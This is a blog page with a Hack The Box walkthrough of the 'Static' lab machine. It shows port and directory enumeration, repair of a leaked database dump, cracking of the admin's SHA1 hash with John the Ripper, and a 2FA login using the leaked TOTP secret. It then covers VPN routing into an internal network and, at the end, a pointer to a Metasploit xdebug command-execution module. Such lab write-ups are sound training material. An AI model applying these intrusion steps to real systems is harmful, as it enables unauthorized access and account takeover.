<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	19 Jun 2021IP:	10.10.10.246">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[static]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/06/26/static/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	19 Jun 2021IP:	10.10.10.246">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2006.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2007.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2008.jpg">
<meta property="article:published_time" content="2021-06-26T07:19:26.000Z">
<meta property="article:modified_time" content="2021-12-18T18:01:24.819Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2006.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/06/26/static/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/06/26/static/","path":"2021/06/26/static/","title":"Hack-The-Box-walkthrough[static]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[static] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">49</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">210</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-80"><span class="nav-number">3.</span> <span class="nav-text">Port-80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-escalation"><span class="nav-number">4.</span> <span class="nav-text">Privilege escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-1"><span class="nav-number">4.1.</span> <span class="nav-text">Step 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-2"><span class="nav-number">4.2.</span> <span class="nav-text">Step 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-3"><span class="nav-number">4.3.</span> <span class="nav-text">Step 3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-4"><span class="nav-number">4.4.</span> <span class="nav-text">Step 4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-1-1"><span class="nav-number">4.5.</span> <span class="nav-text">Step 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-2-1"><span class="nav-number">4.6.</span> <span class="nav-text">Step 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-3-1"><span class="nav-number">4.7.</span> <span class="nav-text">Step 3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-4-1"><span class="nav-number">4.8.</span> <span class="nav-text">Step 4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#openssl"><span class="nav-number">4.9.</span> <span class="nav-text">openssl</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">5.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">6.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">210</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">49</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/06/26/static/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[static] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[static]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-26 15:19:26" itemprop="dateCreated datePublished" datetime="2021-06-26T15:19:26+08:00">2021-06-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-12-19 02:01:24" itemprop="dateModified" datetime="2021-12-19T02:01:24+08:00">2021-12-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>5.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>21 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Hard<br>Points:	40<br>Release:	19 Jun 2021<br>IP:	10.10.10.246</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2006.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># nmap -sV -sC -v -p- --min-rate=10000 10.10.10.246</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)</span><br><span class="line">|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)</span><br><span class="line">|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)</span><br><span class="line">2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)</span><br><span class="line">|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)</span><br><span class="line">|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)</span><br><span class="line">8080/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/vpn/ /.ftp_uploads/</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html; charset=UTF-8).</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>

<p>There are three ports open 22:ssh,2222:ssh(Strange) 8080:http</p>
<h3 id="Port-80"><a href="#Port-80" class="headerlink" title="Port-80"></a>Port-80</h3><p>Blank Page Strange.</p>
<p>Now let’s use gobuster.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># gobuster dir -u http://10.10.10.246:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,txt</span></span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 0]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 55]</span><br></pre></td></tr></table></figure>

<p>Found robots.txt let’s check it out what directories disallow there.</p>
<ul>
<li>&#x2F;vpn&#x2F;</li>
</ul>
<p>There is a login page and we don’t have creads for that.</p>
<ul>
<li>&#x2F;.ftp_uploads&#x2F;</li>
</ul>
<p>Two files first is db.sql.gz and second is warning.txt</p>
<p>Warning tell us about the db.sql.gz file that been corrupted while transfer!!</p>
<p>After some google i found a tool for fix the corrupted gz files.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lvbmphci9maXhneg==">fixgz<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>But first install the requirements for that.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install g++</span><br></pre></td></tr></table></figure>

<p>let’s compile that cpp file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># g++ fixgz.cpp -o fixgz</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">fixgz  fixgz.cpp</span><br></pre></td></tr></table></figure>

<p>Now let’s fix the corrupted gz file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">db.sql.gz  fixgz  fixgz.cpp</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># ./fixgz db.sql.gz db.gz</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">db.gz  db.sql.gz  fixgz  fixgz.cpp</span><br></pre></td></tr></table></figure>

<p>Now it’s fixed let’s extract the gz file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># gunzip db.gz</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># ls -la</span></span><br><span class="line">总用量 40</span><br><span class="line">drwxr-xr-x  2 root root  4096  6月 26 05:58 .</span><br><span class="line">drwxr-xr-x 98 root root  4096  6月 25 11:14 ..</span><br><span class="line">-rw-r--r--  1 root root   355  6月 26 05:57 db</span><br><span class="line">-rw-r--r--  1 root root   262  6月 26 05:56 db.sql.gz</span><br><span class="line">-rwxr-xr-x  1 root root 16904  6月 26 05:55 fixgz</span><br><span class="line">-rw-r--r--  1 root root  1394  9月 13  2020 fixgz.cpp</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># cat db</span></span><br><span class="line">CREATE DATABASE static;</span><br><span class="line">USE static;</span><br><span class="line">CREATE TABLE <span class="built_in">users</span> ( <span class="built_in">id</span> smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (<span class="built_in">id</span>) ); </span><br><span class="line">INSERT INTO <span class="built_in">users</span> ( <span class="built_in">id</span>, username, password, totp ) VALUES ( null, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;d033e22ae348aeb5660fc2140aec35850c4da997&#x27;</span>, <span class="string">&#x27;orxxi4c7orxwwzlo&#x27;</span> );</span><br></pre></td></tr></table></figure>

<p>Now let’s try to crack the hash(d033e22ae348aeb5660fc2140aec35850c4da997).</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># john hash</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-SHA1-AxCrypt&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-SHA1-AxCrypt&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-SHA1-Linkedin&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-SHA1-Linkedin&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;ripemd-160&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=ripemd-160&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;has-160&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=has-160&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-SHA1 [SHA1 256/256 AVX2 8x])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=4</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Almost <span class="keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">admin            (?)</span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2021-06-26 06:00) 6.666g/s 18826p/s 18826c/s 18826C/s Winnie..admin1</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-SHA1&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>Got the username(admin) &amp; password(admin) let’s try to login in inside &#x2F;vpn&#x2F;login.php</p>
<p>Admin account has 2FA enabled.</p>
<p>But the good news is we have the secret totp(orxxi4c7orxwwzlo)</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9hZGRvbnMubW96aWxsYS5vcmcvZW4tVVMvZmlyZWZveC9hZGRvbi9hdXRoLWhlbHBlci8=">firefox add-ons Authenticator<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Let’s use this extension and get the OTP.</p>
<p>Copy the OPT and send it.</p>
<p>Now we are inside Support Portal</p>
<p>Let’s type web and get the web.ovpn file.</p>
<p>Now let’s connect with web.ovpn file.</p>
<p>But it’s giving us error let’s check the file.</p>
<p>We see that it’s want vpn.static.htb</p>
<p>let’s add this inside &#x2F;etc&#x2F;hosts.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.246       vpn.static.htb</span><br></pre></td></tr></table></figure>

<p>Now let’s try to connect.</p>
<p>Now let’s go to this web ip.</p>
<p>But it’s loading and we can’t see the web page.</p>
<p>We see in the image that we have two interface first tun0 second tun9 but in tun9 we have the ip 172.30.0.9 and the web page we want to access that’s ip is 172.20.0.10</p>
<p>So we want to add the route for access the web page in tun9 interface.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route add 172.20.0.0/24 dev tun9</span><br></pre></td></tr></table></figure>

<p>And now we can access the web page.</p>
<p>Let’s go to info.php</p>
<p>And we have the phpinfo page.</p>
<p>Found the xdebug let’s check the exploit for that.</p>
<p>Got the metasploit module let’s try to exploit with that.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucmFwaWQ3LmNvbS9kYi9tb2R1bGVzL2V4cGxvaXQvdW5peC9odHRwL3hkZWJ1Z191bmF1dGhfZXhlYy8=">xdebug Unauthenticated OS Command Execution<i class="fa fa-external-link-alt"></i></span></li>
</ul>
